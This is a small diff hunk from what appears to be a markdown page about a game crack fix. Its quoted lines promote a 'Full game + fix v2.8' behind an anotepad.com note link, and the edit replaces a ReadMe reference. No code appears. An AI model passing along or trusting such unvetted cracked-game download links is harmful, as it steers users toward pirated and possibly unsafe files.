@@ -20,7 +20,7 @@ If you've already tried adding `steam_api64.dll` and `steam_appid.txt` with no l
 > Link in notepad : https://anotepad.com/notes/ngjhjg6s
 >
 > Full game + fix v2.8 — content all file to run.
-> please read file `ReadMe.txt` before playing.
+> please read file **this file carefully** before playing.
 
 ---
 
